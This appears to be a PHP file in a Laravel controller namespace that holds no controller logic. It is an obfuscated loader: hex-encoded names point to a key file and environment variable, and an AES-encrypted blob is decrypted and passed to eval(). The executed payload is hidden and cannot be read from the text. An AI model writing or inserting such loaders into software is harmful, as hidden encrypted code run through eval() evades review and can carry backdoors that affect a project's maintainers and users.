<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('UMui5+mbJJGelPDlFOO5jQ==');

$c=base64_decode(

'vsTyDUssYsROApAcp0Iv1gLVQdcXdWey++LoViSqwJKHoT/daPb8ccJM9INb5kF3QF/9cYqRnjpv' .
'2PUuLAkcEnpz8eFbg+reW3FR1SX/KeLZP9uYyCY6wj3+b1My5tsMrAAxIDDxOG8SmzibKEBDi5vB' .
'wEUuw+2DK7X+OhTKpaHtZ6NfCnZBw/NJLjTkjrsdxeb3M2gfDKWoLOcV9FIb8axarbyt5h13aqLK' .
'FQBp65t+wAoZ/UsSelPCpRxSC2b3'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

